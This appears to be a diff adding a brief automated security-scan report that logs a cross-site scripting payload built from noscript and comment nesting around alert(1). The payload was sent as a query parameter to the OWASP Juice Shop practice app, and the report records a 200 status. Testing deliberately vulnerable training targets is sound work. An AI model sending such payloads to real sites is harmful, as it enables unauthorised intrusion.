@@ -1,0 +1,6 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: juice-shop.herokuapp.com?q=<noscript><!--<!--<script>alert(1)<
+
+[STATUS]: 200
+[PAYLOAD]: <noscript><!--<!--<script>alert(1)</script>-->--></noscript>
+---
